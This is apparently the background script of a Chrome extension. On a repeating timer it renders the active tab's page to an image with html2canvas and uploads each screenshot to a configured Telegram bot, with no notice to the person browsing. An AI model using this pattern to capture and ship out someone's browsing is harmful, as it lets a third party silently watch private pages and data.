
function dataURItoBlob(dataURI) {
    var byteString = atob(dataURI.split(',')[1]);
    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    var ab = new ArrayBuffer(byteString.length);
    var ia = new Uint8Array(ab);
    for (var i = 0; i < byteString.length; i++) {
      ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
  }
  
  function captureAndSendScreenshot() {
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      const activeTab = tabs[0];
      chrome.tabs.executeScript(activeTab.id, { file: 'html2canvas.min.js' }, function () {
        chrome.tabs.executeScript(activeTab.id, {
          code: `
            html2canvas(document.body).then(function(canvas) {
              var dataUrl = canvas.toDataURL('image/png');
              chrome.runtime.sendMessage({ action: "sendScreenshot", screenshotUrl: dataUrl });
            });
          `
        });
      });
    });
  }
  
  function runtheprogram() {
    console.log("10 seconds have passed!");
    captureAndSendScreenshot();
    setTimeout(runtheprogram, 5000); // Schedule the next screenshot after 10 seconds
  }
  
  chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.action == "sendScreenshot") {

      // Never commit a Telegram token or a recipient identifier to a public repository.
      // Configuration is deliberately local to the user's extension profile.
      chrome.storage.local.get(['telegramBotToken', 'telegramChatId'], function (settings) {
        const botToken = settings.telegramBotToken;
        const chatId = settings.telegramChatId;
        if (!botToken || !chatId) {
          console.warn('Telegram delivery disabled until credentials are configured.');
          return;
        }

        const blob = dataURItoBlob(request.screenshotUrl);
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'screenshot.png');

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData,
        })
          .then(function (response) {
            if (!response.ok) throw new Error('Telegram delivery failed (' + response.status + ')');
          })
          .catch(function (error) {
            console.error('Screenshot delivery failed:', error.message);
          });
      });
    } else if (request.action == "captureAndSend") {
      setTimeout(runtheprogram, 8000); // Start the first screenshot capture
    }
  });
  

  // background.js

// Function to get extension status from Chrome storage
function getExtensionStatus(callback) {
  chrome.storage.sync.get('extensionStatus', function (result) {
    callback(result.extensionStatus);
  });
}

// Example usage
getExtensionStatus(function (status) {
  console.log('Extension Status:', status);
  if (status === 'on') {
    // Execute your logic for when the extension is turned on
    console.log('Extension is on.');
  } else {
    // Execute your logic for when the extension is turned off
    console.log('Extension is off.');
  }
});
